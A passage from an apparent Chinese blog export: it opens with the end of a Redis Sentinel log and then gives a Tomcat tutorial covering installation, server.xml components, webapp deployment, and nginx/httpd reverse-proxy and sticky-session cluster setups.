192.168.1.18:6379 192.168.1.18 6379 @ mymaster 192.168.1.30 6379 2448:X 24 Jul 17:07:50.405 # -sdown slave 192.168.1.18:6379 192.168.1.18 6379 @ mymaster 192.168.1.30 6379 当然，redis-HA方案有好几种，我们也可以用keepalived+VIP来实现，将master、backup、slave分离开来，master、backup自动VIP切换。\n","permalink":"https://www.fenghong.tech/blog/2018/2018-07-20-redis/","tags":["Linux","internet","server","redis"],"title":"Redis"},{"categories":["ops"],"contents":"摘要：\n Tomcat相关的概念及安装 Tomcat的配置及解释 httpd/Nginx/Ajp下的tomcat集群实现 Mencached下的Tomcat会话存储  Tomcat相关概念 Tomcat是由Apache软件基金会下属的Jakarta项目开发的一个Servlet容器，按照Sun Microsystems提供的技术规范，实现了对Servlet和JavaServer Page（JSP）的支持，并提供了作为Web服务器的一些特有功能，如Tomcat管理和控制平台、安全域管理和Tomcat阀等。由于Tomcat本身也内含了一个HTTP服务器，它也可以被视作一个单独的Web服务器。但是，不能将Tomcat和Apache HTTP服务器混淆，Apache HTTP服务器是一个用C语言实现的HTTPWeb服务器；这两个HTTP web server不是捆绑在一起的。Apache Tomcat包含了一个配置管理工具，也可以通过编辑XML格式的配置文件来进行配置。Tomcat是Java 2 EE技术体系的不完整实现。\n JDK：java工具箱 JRE：java运行时环境 JVM：C语言研发，java虚拟机 ajp：AJP13是定向包协议，httpd支持此协议，nginx不支持 jsp：java server page jasper：负责将.jsp 转换为 .java applet：Applet或Java小应用程序是一种在Web环境下，运行于客户端的Java程序组件 servlet：全称Java Servlet， 是用Java编写的服务器端程序，其主要功能在于交互式地浏览和修改数据，生成动态Web内容，将.java转换成字节码  安装Tomcat yum包安装 # yum install java-1.8.0-openjdk # yum install tomcat tomcat-webapps tomcat-admin-webapps tomcat-docs-webapp # java -version #查看java版本信息 # tomcat version #查看tomcat版本信息 启动服务：\n# systemctl start tomcat # ss -tnl LISTEN 0 1 ::ffff:127.0.0.1:8005 #管理端口，建议关闭 LISTEN 0 100 :::8009 #AJP协议默认监听端口 LISTEN 0 100 :::8080 #HTTP协议默认监听端口 tomcat的目录结构：\n配置文件目录：/etc/tomcat/ 主配置文件：server.xml webapps存放位置：/var/lib/tomcat/webapps/ 环境配置文件：/etc/sysconfig/tomcat 官方发行版安装 安装JDK：\n下载地址：http://www.oracle.com/technetwork/java/javase/downloads/\n# rpm -ivh jdk-8u25-linux-x64.rpm # ll /usr/java/ #默认安装路径 lrwxrwxrwx 1 root root 16 Jul 17 19:46 default -\u0026gt; /usr/java/latest drwxr-xr-x 9 root root 268 Jul 17 19:46 jdk1.8.0_25 lrwxrwxrwx 1 root root 21 Jul 17 19:46 latest -\u0026gt; /usr/java/jdk1.8.0_25 # vim /etc/profile.d/java.sh #将java环境变量加入系统环境变量 export JAVA_HOME=/usr/java/latest export PATH=$JAVA_HOME/bin:$PATH # . /etc/profile.d/java.sh 安装Tomcat：\n下载地址：http://mirrors.tuna.tsinghua.edu.cn/apache/tomcat/tomcat-8/v8.5.32/bin/apache-tomcat-8.5.32.tar.gz\n# useradd tomcat # tar xf apache-tomcat-8.5.32.tar.gz -C /usr/local/ # cd /usr/local/ local]# ln -sv apache-tomcat-8.5.32/ tomcat local]# cd tomcat/ tomcat]# chgrp -R tomcat ./* tomcat]# chown -R tomcat logs/ temp/ work/ tomcat]# chmod g+rx conf/ tomcat]# chmod g+r conf/* # vim /etc/profile.d/tomcat.sh #配置环境变量 export CATALINA_BASE=/usr/local/tomcat export PATH=$CATALINA_BASE/bin:$PATH # . /etc/profile.d/tomcat.sh # su - tomcat -c 'catalina.sh start'  # ls -1 /usr/local/tomcat/ bin：脚本及启动时用到的类 conf：配置文件目录 lib：库文件，Java类库，jar logs：日志文件目录 temp：临时文件目录 webapps：webapp的默认目录 work：工作目录\n # catalina.sh --help commands: debug #调试模式启动 jpda start #jpda的debug模式启动 run #前台启动 start #后台启动 stop #关闭 stop n #n秒后关闭 stop -force #强制关闭 stop n -force #n秒后强制关闭 configtest #测试配置文件语法 version #查看相关版本信息 # catalina.sh version Using CATALINA_BASE: /usr/local/tomcat Using CATALINA_HOME: /usr/local/tomcat Using CATALINA_TMPDIR: /usr/local/tomcat/temp Using JRE_HOME: /usr/java/latest Using CLASSPATH: /usr/local/tomcat/bin/bootstrap.jar:/usr/local/tomcat/bin/tomcat-juli.jar Server version: Apache Tomcat/8.5.32 Server built: Jun 20 2018 19:50:35 UTC Server number: 8.5.32.0 OS Name: Linux OS Version: 3.10.0-862.el7.x86_64 Architecture: amd64 JVM Version: 1.8.0_25-b17 JVM Vendor: Oracle Corporation manager、host-manager和docs 依赖包：\n tomcat-webapps tomcat-admin-webapps tomcat-docs-webapp  配置：manager管理webapps应用程序 # vim /etc/tomcat/tomcat-users.xml \u0026lt;role rolename=\u0026quot;manager-gui\u0026quot;/\u0026gt; \u0026lt;user username=\u0026quot;admin\u0026quot; password=\u0026quot;adminpass\u0026quot; roles=\u0026quot;manager-gui\u0026quot;/\u0026gt; # systemctl restart tomcat  访问：http://192.168.0.8:8080/manager/进入管理页面\n 配置：host-manager管理虚拟主机 # vim /etc/tomcat/tomcat-users.xml \u0026lt;role rolename=\u0026quot;admin-gui\u0026quot;/\u0026gt; \u0026lt;user username=\u0026quot;admin\u0026quot; password=\u0026quot;admin\u0026quot; roles=\u0026quot;manager-gui,admin-gui\u0026quot;/\u0026gt; # systemctl restart tomcat  访问：http://192.168.0.10:8080/host-manager/进入管理页面\n docs获取离线文档  访问：http://192.168.0.10:8080/docs/\n Tomcat的配置参数  server.xml：主配置文件 web.xml：每个webapp只有“部署”后才能被访问，它的部署方式通常由web.xml进行定义，其存放位置为WEB-INF/目录中；此文件为所有的webapps提供默认部署相关的配置 context.xml：每个webapp都可以专用的配置文件，它通常由专用的配置文件context.xml来定义，其存放位置为WEB-INF/目录中；此文件为所有的webapps提供默认配置 tomcat-users.xml：用户认证的账号和密码文件 catalina.policy：当使用-security选项启动tomcat时，用于为tomcat设置安全策略 catalina.properties：Java属性的定义文件，用于设定类加载器路径，以及一些与JVM调优相关参数 logging.properties：日志系统相关的配置  tomcat的核心组件：server.xml 配置文件框架：\n\u0026lt;Server\u0026gt; \u0026lt;Service\u0026gt; \u0026lt;connector/\u0026gt; \u0026lt;Engine\u0026gt; \u0026lt;Host\u0026gt; \u0026lt;Context\u0026gt; \u0026lt;Valve/\u0026gt; \u0026lt;/Context/\u0026gt; \u0026lt;/Host\u0026gt; \u0026lt;/Engine\u0026gt; \u0026lt;/Service\u0026gt; \u0026lt;/Server\u0026gt; 每一个组件都由一个Java“类”实现，这些组件大体可分为以下几个类型：\n 顶级组件：Server 服务类组件：Service 连接器组件：http, https, ajp（apache jserv protocol） 容器类：Engine, Host, Context 被嵌套类：valve, logger, realm, loader, manager, \u0026hellip; 集群类组件：listener, cluster, \u0026hellip;  Tomcat的常用组件配置：  Server：代表tomcat instance，即表现出的一个java进程；监听在8005端口，只接收“SHUTDOWN”。各server监听的端口不能相同，因此，在同一物理主机启动多个实例时，需要修改其监听端口为不同的端口； Service：用于实现将一个或多个connector组件关联至一个engine组件； Connector组件：负责接收请求，常见的有三类http/https/ajp；  port=\u0026quot;8080\u0026quot; 监听的端口 protocol=\u0026quot;HTTP/1.1\u0026quot; 协议 connectionTimeout=\u0026quot;20000\u0026quot; 连接超时时间，单位ms，2秒 address：监听的IP地址；默认为本机所有可用地址； maxThreads：最大并发连接数，默认为200； enableLookups：是否启用DNS查询功能； acceptCount：等待队列的最大长度； secure：安全相关; sslProtocol：加密传输相关;  Engine组件：Servlet实例，即servlet引擎，其内部可以一个或多个host组件来定义站点； 通常需要通过defaultHost属性来定义默认的虚拟主机；  name= defaultHost=\u0026quot;localhost\u0026quot; jvmRoute=  Host组件：位于engine内部用于接收请求并进行相应处理的主机或虚拟主机  \u0026lt;Host name=\u0026quot;localhost\u0026quot; appBase=\u0026quot;webapps\u0026quot; unpackWARs=\u0026quot;true\u0026quot; autoDeploy=\u0026quot;true\u0026quot;\u0026gt; \u0026lt;/Host\u0026gt; appBase：此Host的webapps的默认存放目录，指存放非归档的web应用程序的目录或归档的WAR文件目录路径；可以使用基于$CATALINA_BASE变量所定义的路径的相对路径； autoDeploy：在Tomcat处于运行状态时，将某webapp放置于appBase所定义的目录中时，是否自动将其部署至tomcat；  Context组件：相当于nginx中的alias的功能  \u0026lt;Context path=\u0026quot;/PATH\u0026quot; docBase=\u0026quot;/PATH/TO/SOMEDIR\u0026quot; reloadable=\u0026quot;\u0026quot;/\u0026gt; path:url路径 docBase:网页文件目录路径  Valve组件：  定义访问日志：org.apache.catalina.valves.AccessLogValve \u0026lt;Valve className=\u0026quot;org.apache.catalina.valves.AccessLogValve\u0026quot; directory=\u0026quot;logs\u0026quot; prefix=\u0026quot;localhost_access_log.\u0026quot; suffix=\u0026quot;.txt\u0026quot; pattern=\u0026quot;%h %l %u %t \u0026amp;quot;%r\u0026amp;quot; %s %b\u0026quot; /\u0026gt; 定义访问控制：org.apache.catalina.valves.RemoteAddrValve \u0026lt;Valve className=\u0026quot;org.apache.catalina.valves.RemoteAddrValve\u0026quot; deny=\u0026quot;172\\.16\\.100\\.67\u0026quot;/\u0026gt; 组件配置示例：  配置示例：Host组件  [root@node1 ~]# vim /etc/tomcat/server.xml \u0026lt;Engine\u0026gt; ... \u0026lt;Host name=\u0026quot;node1.fenghong.tech\u0026quot; appBase=\u0026quot;/web/apps\u0026quot; unpackWARs=\u0026quot;true\u0026quot; autoDeploy=\u0026quot;true\u0026quot;/\u0026gt; \u0026lt;/Engine\u0026gt; [root@node1 ~]# mkdir -pv /web/apps/ROOT/ [root@node1 ~]# vim /web/apps/ROOT/index.jsp \u0026lt;%@ page language=\u0026quot;java\u0026quot; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;TomcatA\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;\u0026lt;font color=\u0026quot;red\u0026quot;\u0026gt;TomcatA.fenghong.tech\u0026lt;/font\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;table align=\u0026quot;centre\u0026quot; border=\u0026quot;1\u0026quot;\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;Session ID\u0026lt;/td\u0026gt; \u0026lt;% session.setAttribute(\u0026quot;fenghong.tech\u0026quot;,\u0026quot;fenghong.tech\u0026quot;); %\u0026gt; \u0026lt;td\u0026gt;\u0026lt;%= session.getId() %\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;Created on\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;%= session.getCreationTime() %\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; [root@node1 ~]# systemctl restart tomcat 测试访问：http://node1.fenghong.tech:8080/  配置示例：Context组件  [root@node1 ~]# vim /etc/tomcat/server.xml \u0026lt;Engine\u0026gt; ... \u0026lt;Host name=\u0026quot;node1.fenghong.tech\u0026quot; appBase=\u0026quot;/web/apps\u0026quot; unpackWARs=\u0026quot;true\u0026quot; autoDeploy=\u0026quot;true\u0026quot;\u0026gt; \u0026lt;Context path=\u0026quot;/testapp\u0026quot; docBase=\u0026quot;/web/testapp\u0026quot; reloadable=\u0026quot;\u0026quot;/\u0026gt; \u0026lt;/Host\u0026gt; \u0026lt;/Engine\u0026gt; [root@node1 ~]# systemctl restart tomcat [root@node1 ~]# mkdir -pv /web/testapp/ROOT [root@node1 ~]# vim /web/testapp/index.jsp ... 测试访问：http://node1.fenghong.tech:8080/testapp/  配置示例：Valve组件  [root@node1 ~]# vim /etc/tomcat/server.xml \u0026lt;Host name=\u0026quot;node1.fenghong.tech\u0026quot; appBase=\u0026quot;/web/apps\u0026quot; unpackWARs=\u0026quot;true\u0026quot; autoDeploy=\u0026quot;true\u0026quot;\u0026gt; \u0026lt;Context path=\u0026quot;/testapp\u0026quot; docBase=\u0026quot;/web/testapp\u0026quot; reloadable=\u0026quot;\u0026quot;\u0026gt; \u0026lt;Valve className=\u0026quot;org.apache.catalina.valves.AccessLogValve\u0026quot; directory=\u0026quot;logs\u0026quot; prefix=\u0026quot;node1_test_access_\u0026quot; suffix=\u0026quot;.log\u0026quot; pattern=\u0026quot;%h %l %u %t \u0026amp;quot;%r\u0026amp;quot; %s %b\u0026quot; /\u0026gt; \u0026lt;/Context\u0026gt; \u0026lt;/Host\u0026gt; [root@node1 ~]# systemctl restart tomcat [root@node1 ~]# tail /var/log/tomcat/node1_test_access_2018-07-17.log 192.168.0.8 - - [17/Jul/2018:22:59:30 +0800] \u0026quot;GET /testapp/ HTTP/1.1\u0026quot; 200 334 JSP WebAPP的组织结构：  index.jsp：主页； WEB-INF/：当前webapp的私有资源路径；通常用于存储当前webapp的web.xml和context.xml配置文件； META-INF/：类似于WEB-INF/； classes/：类文件，当前webapp所提供的类； lib/：类文件，当前webapp所提供的类，被打包为jar格式；  webapp归档格式：  .war：webapp .jar：EJB的类打包文件； .rar：资源适配器类打包文件； .ear：企业级webapp；  部署(deploy)webapp  deploy：将webapp的源文件放置于目标目录(网页程序文件存放目录)，配置tomcat服务器能够基于web.xml和context.xml文件中定义的路径来访问此webapp；将其特有的类和依赖的类通过class loader装载至JVM； undeploy：反部署，停止webapp，并从tomcat实例上卸载webapp； start：启动处于停止状态的webapp； stop：停止webapp，不再向用户提供服务；其类依然在jvm上； redeploy：重新部署；  部署可分为自动部署和手动部署；手动部署又有冷部署和热部署：\n 冷部署：把webapp复制到指定的位置，而后才启动tomcat； 热部署：在不停止tomcat的前提下进行部署；部署工具有manager、ant脚本、tcd(tomcat client deployer)等；  示例：手动提供一测试类应用，并冷部署\n[root@node1 ~]# mkdir -pv /var/lib/tomcat/webapps/test/{classes,lib,WEB-INF} [root@node1 ~]# vim /var/lib/tomcat/webapps/test/index.jsp \u0026lt;%@ page language=\u0026quot;java\u0026quot; %\u0026gt; \u0026lt;%@ page import=\u0026quot;java.util.*\u0026quot; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Test Page\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;% out.println(\u0026quot;hello world\u0026quot;); %\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 访问：http://192.168.0.10:8080/test/ NT：nginx | httpd + tomcat nginx和Tomcat通过http/https协议工作 配置Tomcat：\n[root@tomcat ~]# mkdir -pv /data/webapp/ROOT/ [root@tomcat ~]# vim /data/webapp/ROOT/index.jsp #提供jsp测试页 \u0026lt;%@ page language=\u0026quot;java\u0026quot; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;TomcatA\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;\u0026lt;font color=\u0026quot;red\u0026quot;\u0026gt;TomcatA.fenghong.tech\u0026lt;/font\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;table align=\u0026quot;centre\u0026quot; border=\u0026quot;1\u0026quot;\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;Session ID\u0026lt;/td\u0026gt; \u0026lt;% session.setAttribute(\u0026quot;fenghong.tech\u0026quot;,\u0026quot;fenghong.tech\u0026quot;); %\u0026gt; \u0026lt;td\u0026gt;\u0026lt;%= session.getId() %\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;Created on\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;%= session.getCreationTime() %\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; [root@tomcat ~]# vim /data/webapp/ROOT/test.html #提供静态测试页 static page [root@tomcat ~]# vim /etc/tomcat/server.xml #修改Tomcat配置，如下 \u0026lt;?xml version='1.0' encoding='utf-8'?\u0026gt; \u0026lt;Server port=\u0026quot;-1\u0026quot; shutdown=\u0026quot;SHUTDOWN\u0026quot;\u0026gt; \u0026lt;Listener className=\u0026quot;org.apache.catalina.startup.VersionLoggerListener\u0026quot; /\u0026gt; \u0026lt;Listener className=\u0026quot;org.apache.catalina.core.AprLifecycleListener\u0026quot; SSLEngine=\u0026quot;on\u0026quot; /\u0026gt; \u0026lt;Listener className=\u0026quot;org.apache.catalina.core.JasperListener\u0026quot; /\u0026gt; \u0026lt;Listener className=\u0026quot;org.apache.catalina.core.JreMemoryLeakPreventionListener\u0026quot; /\u0026gt; \u0026lt;Listener className=\u0026quot;org.apache.catalina.mbeans.GlobalResourcesLifecycleListener\u0026quot; /\u0026gt; \u0026lt;Listener className=\u0026quot;org.apache.catalina.core.ThreadLocalLeakPreventionListener\u0026quot; /\u0026gt; \u0026lt;GlobalNamingResources\u0026gt; \u0026lt;Resource name=\u0026quot;UserDatabase\u0026quot; auth=\u0026quot;Container\u0026quot; type=\u0026quot;org.apache.catalina.UserDatabase\u0026quot; description=\u0026quot;User database that can be updated and saved\u0026quot; factory=\u0026quot;org.apache.catalina.users.MemoryUserDatabaseFactory\u0026quot; pathname=\u0026quot;conf/tomcat-users.xml\u0026quot; /\u0026gt; \u0026lt;/GlobalNamingResources\u0026gt; \u0026lt;Service name=\u0026quot;Catalina\u0026quot;\u0026gt; \u0026lt;Connector address=\u0026quot;127.0.0.1\u0026quot; port=\u0026quot;8080\u0026quot; protocol=\u0026quot;HTTP/1.1\u0026quot; connectionTimeout=\u0026quot;20000\u0026quot; redirectPort=\u0026quot;8443\u0026quot; /\u0026gt; \u0026lt;!-- \u0026lt;Connector address=\u0026quot;127.0.0.1\u0026quot; port=\u0026quot;8009\u0026quot; protocol=\u0026quot;AJP/1.3\u0026quot; redirectPort=\u0026quot;8443\u0026quot; /\u0026gt; --\u0026gt; \u0026lt;Engine name=\u0026quot;Catalina\u0026quot; defaultHost=\u0026quot;node1.fenghong.tech\u0026quot;\u0026gt; \u0026lt;Realm className=\u0026quot;org.apache.catalina.realm.LockOutRealm\u0026quot;\u0026gt; \u0026lt;Realm className=\u0026quot;org.apache.catalina.realm.UserDatabaseRealm\u0026quot; resourceName=\u0026quot;UserDatabase\u0026quot;/\u0026gt; \u0026lt;/Realm\u0026gt; \u0026lt;Host name=\u0026quot;localhost\u0026quot; appBase=\u0026quot;webapps\u0026quot; unpackWARs=\u0026quot;true\u0026quot; autoDeploy=\u0026quot;true\u0026quot;\u0026gt; \u0026lt;Valve className=\u0026quot;org.apache.catalina.valves.AccessLogValve\u0026quot; directory=\u0026quot;logs\u0026quot; prefix=\u0026quot;localhost_access_log.\u0026quot; suffix=\u0026quot;.txt\u0026quot; pattern=\u0026quot;%h %l %u %t \u0026amp;quot;%r\u0026amp;quot; %s %b\u0026quot; /\u0026gt; \u0026lt;/Host\u0026gt; \u0026lt;Host name=\u0026quot;node1.fenghong.tech\u0026quot; appBase=\u0026quot;/data/webapp\u0026quot; unpackWARs=\u0026quot;true\u0026quot; autoDeploy=\u0026quot;true\u0026quot;\u0026gt; \u0026lt;Valve className=\u0026quot;org.apache.catalina.valves.AccessLogValve\u0026quot; directory=\u0026quot;logs\u0026quot; prefix=\u0026quot;node1-dongfei-tech_access.\u0026quot; suffix=\u0026quot;.log\u0026quot; pattern=\u0026quot;%h %l %u %t \u0026amp;quot;%r\u0026amp;quot; %s %b\u0026quot; /\u0026gt; \u0026lt;/Host\u0026gt; \u0026lt;/Engine\u0026gt; \u0026lt;/Service\u0026gt; \u0026lt;/Server\u0026gt; [root@tomcat ~]# systemctl start tomcat 配置nginx：\n[root@tomcat ~]# vim /etc/nginx/conf.d/nginx_tomcat.conf server { listen 80; server_name node1.fenghong.tech; index index.jsp index.html; location / { root \u0026quot;/data/webapp/ROOT/\u0026quot;; } location ~* \\.(jsp|do)$ { proxy_pass http://127.0.0.1:8080; } } [root@tomcat ~]# nginx  测试访问：\n http://node1.fenghong.tech/ http://node1.fenghong.tech/test.html   httpd和Tomcat通过http/https协议工作 [root@tomcat ~]# httpd -M |grep proxy proxy_module (shared) #代理模块 proxy_ajp_module (shared) #适配ajp协议客户端 proxy_balancer_module (shared) proxy_connect_module (shared) proxy_express_module (shared) proxy_fcgi_module (shared) proxy_fdpass_module (shared) proxy_ftp_module (shared) proxy_http_module (shared) #适配http协议客户端 proxy_scgi_module (shared) proxy_wstunnel_module (shared) 配置Tomcat：如上\n配置httpd：\n[root@tomcat ~]# vim /etc/httpd/conf.d/http_tomcat.conf \u0026lt;VirtualHost *:80\u0026gt; ServerName node1.fenghong.tech ProxyRequests Off #关闭正向代理 ProxyVia On ProxyPreserveHost On #将请求头HOST发送给后端主机 \u0026lt;Proxy *\u0026gt; Require all granted \u0026lt;/Proxy\u0026gt; ProxyPass / http://127.0.0.1:8080/ \u0026lt;Location /\u0026gt; Require all granted \u0026lt;/Location\u0026gt; \u0026lt;/VirtualHost\u0026gt; [root@tomcat ~]# systemctl start httpd http和Tomcat通过ajp协议工作 配置Tomcat：\n[root@tomcat ~]# vim /etc/tomcat/server.xml \u0026lt;Connector address=\u0026quot;127.0.0.1\u0026quot; port=\u0026quot;8009\u0026quot; protocol=\u0026quot;AJP/1.3\u0026quot; redirectPort=\u0026quot;8443\u0026quot; /\u0026gt; [root@tomcat ~]# systemctl restart tomcat 配置httpd：\n[root@tomcat ~]# vim /etc/httpd/conf.d/http_tomcat.conf \u0026lt;VirtualHost *:80\u0026gt; ServerName node1.fenghong.tech ProxyRequests Off ProxyVia On ProxyPreserveHost On \u0026lt;Proxy *\u0026gt; Require all granted \u0026lt;/Proxy\u0026gt; ProxyPass / ajp://127.0.0.1:8009/ \u0026lt;Location /\u0026gt; Require all granted \u0026lt;/Location\u0026gt; \u0026lt;/VirtualHost\u0026gt; [root@tomcat ~]# systemctl restart httpd nntm的会话保持实现   session sticky：会话绑定\n source_ip：基于源地址做会话绑定；nginx: ip_hash，haproxy: source，lvs: sh cookie：基于cookie做会话绑定；nginx：hash，haproxy: cookie    httpd + nginx + tomcat cluster：基于cookie实现会话绑定 前端httpd调度器：\n[root@Director ~]# httpd -M |grep balancer proxy_balancer_module (shared) [root@Director ~]# vim /etc/httpd/conf.d/httpd-tomcat.conf Header add Set-Cookie \u0026quot;ROUTEID=.%{BALANCER_WORKER_ROUTE}e; path=/\u0026quot; env=BALANCER_ROUTE_CHANGED \u0026lt;proxy balancer://tcsrvs\u0026gt; BalancerMember http://192.168.0.10:80 route=TomcatA loadfactor=1 BalancerMember http://192.168.0.11:80 route=TomcatB loadfactor=2 ProxySet lbmethod=byrequests ProxySet stickysession=ROUTEID \u0026lt;/Proxy\u0026gt; \u0026lt;VirtualHost *:80\u0026gt; ServerName www.fenghong.tech ProxyVia On ProxyRequests Off ProxyPreserveHost On \u0026lt;Proxy *\u0026gt; Require all granted \u0026lt;/Proxy\u0026gt; ProxyPass / balancer://tcsrvs/ ProxyPassReverse / balancer://tcsrvs/ \u0026lt;Location /\u0026gt; Require all granted \u0026lt;/Location\u0026gt; \u0026lt;/VirtualHost\u0026gt; [root@Director ~]# systemctl start httpd tomcat-node-1：\n[root@tomcat-node-1 ~]# vim /etc/nginx/conf.d/nginx_tomcat.conf server { listen 80 default_server; server_name node1.fenghong.tech; index index.jsp index.html; location / { root \u0026quot;/data/webapp/ROOT/\u0026quot;; } location ~* \\.(jsp|do)$ { proxy_pass http://127.0.0.1:8080; } } [root@tomcat-node-1 ~]# vim /etc/tomcat/server.xml \u0026lt;Server port=\u0026quot;-1\u0026quot; shutdown=\u0026quot;SHUTDOWN\u0026quot;\u0026gt; \u0026lt;Service name=\u0026quot;Catalina\u0026quot;\u0026gt; \u0026lt;Connector address=\u0026quot;127.0.0.1\u0026quot; port=\u0026quot;8080\u0026quot; protocol=\u0026quot;HTTP/1.1\u0026quot; connectionTimeout=\u0026quot;20000\u0026quot; redirectPort=\u0026quot;8443\u0026quot; /\u0026gt; \u0026lt;Engine name=\u0026quot;Catalina\u0026quot; defaultHost=\u0026quot;node1.fenghong.tech\u0026quot; jvmRoute=\u0026quot;TomcatA\u0026quot;\u0026gt; \u0026lt;Host name=\u0026quot;node1.fenghong.tech\u0026quot; appBase=\u0026quot;/data/webapp\u0026quot; unpackWARs=\u0026quot;true\u0026quot; autoDeploy=\u0026quot;true\u0026quot;\u0026gt; \u0026lt;Valve className=\u0026quot;org.apache.catalina.valves.AccessLogValve\u0026quot; directory=\u0026quot;logs\u0026quot; prefix=\u0026quot;node1-dongfei-tech_access.\u0026quot; suffix=\u0026quot;.log\u0026quot; pattern=\u0026quot;%h %l %u %t \u0026amp;quot;%r\u0026amp;quot; %s %b\u0026quot; /\u0026gt; \u0026lt;/Host\u0026gt; \u0026lt;/Engine\u0026gt; \u0026lt;/Service\u0026gt; \u0026lt;/Server\u0026gt; [root@tomcat-node-1 ~]# vim /data/webapp/ROOT/index.jsp \u0026lt;%@ page language=\u0026quot;java\u0026quot; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;TomcatA\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;\u0026lt;font color=\u0026quot;red\u0026quot;\u0026gt;TomcatA.fenghong.tech\u0026lt;/font\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;table align=\u0026quot;centre\u0026quot; border=\u0026quot;1\u0026quot;\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;Session ID\u0026lt;/td\u0026gt; \u0026lt;% session.setAttribute(\u0026quot;fenghong.tech\u0026quot;,\u0026quot;fenghong.tech\u0026quot;); %\u0026gt; \u0026lt;td\u0026gt;\u0026lt;%= session.getId() %\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;Created on\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;%= session.getCreationTime() %\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; [root@tomcat-node-1 ~]# systemctl start nginx tomcat tomcat-node-2：\n[root@tomcat-node-2 ~]# vim /etc/nginx/conf.d/nginx_tomcat.conf server { listen 80 default_server; server_name node2.fenghong.tech; index index.jsp index.html; location / { root \u0026quot;/data/webapp/ROOT/\u0026quot;; } location ~* \\.(jsp|do)$ { proxy_pass http://127.0.0.1:8080; } } [root@tomcat-node-2 ~]# vim /etc/tomcat/server.xml \u0026lt;Server port=\u0026quot;-1\u0026quot; shutdown=\u0026quot;SHUTDOWN\u0026quot;\u0026gt; \u0026lt;Service name=\u0026quot;Catalina\u0026quot;\u0026gt; \u0026lt;Connector address=\u0026quot;127.0.0.1\u0026quot; port=\u0026quot;8080\u0026quot; protocol=\u0026quot;HTTP/1.1\u0026quot; connectionTimeout=\u0026quot;20000\u0026quot; redirectPort=\u0026quot;8443\u0026quot; /\u0026gt; \u0026lt;Engine name=\u0026quot;Catalina\u0026quot; defaultHost=\u0026quot;node2.fenghong.tech\u0026quot; jvmRoute=\u0026quot;TomcatB\u0026quot;\u0026gt; \u0026lt;Host name=\u0026quot;node2.fenghong.tech\u0026quot; appBase=\u0026quot;/data/webapp\u0026quot; unpackWARs=\u0026quot;true\u0026quot; autoDeploy=\u0026quot;true\u0026quot;\u0026gt; \u0026lt;Valve className=\u0026quot;org.apache.catalina.valves.AccessLogValve\u0026quot; directory=\u0026quot;logs\u0026quot; prefix=\u0026quot;node2-dongfei-tech_access.\u0026quot; suffix=\u0026quot;.log\u0026quot; pattern=\u0026quot;%h %l %u %t \u0026amp;quot;%r\u0026amp;quot; %s %b\u0026quot; /\u0026gt; \u0026lt;/Host\u0026gt; \u0026lt;/Engine\u0026gt; \u0026lt;/Service\u0026gt; \u0026lt;/Server\u0026gt; [root@tomcat-node-2 ~]# vim /data/webapp/ROOT/index.jsp \u0026lt;%@ page language=\u0026quot;java\u0026quot; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;TomcatB\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;\u0026lt;font color=\u0026quot;blue\u0026quot;\u0026gt;TomcatB.fenghong.tech\u0026lt;/font\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;table align=\u0026quot;centre\u0026quot; border=\u0026quot;1\u0026quot;\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;Session ID\u0026lt;/td\u0026gt; \u0026lt;% session.setAttribute(\u0026quot;fenghong.tech\u0026quot;,\u0026quot;fenghong.tech\u0026quot;); %\u0026gt; \u0026lt;td\u0026gt;\u0026lt;%= session.getId() %\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;Created on\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;%= session.getCreationTime() %\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; [root@tomcat-node-2 ~]# systemctl start nginx tomcat  